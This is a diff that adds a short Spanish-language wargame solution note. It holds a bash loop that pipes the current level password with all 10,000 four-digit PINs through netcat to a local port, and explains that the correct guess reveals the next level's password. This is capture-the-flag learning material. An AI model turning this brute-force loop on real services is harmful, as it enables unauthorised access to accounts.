@@ -1,0 +1,3 @@
+for i in {0000..9999};do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002 | grep -v "Wrong"
+ este es un scrip donde se hara una combinacion de numeros de 4 digitos y estos se las combinara con la contrasenai s por eso que pasamos como parametron la contrasenia del nivel actual
+todas estas combinaciones las estamos enviando al puerto 30002 que cuando se envia la combinacion correcta nos proporcionara la contrasenia del siguiente nivel
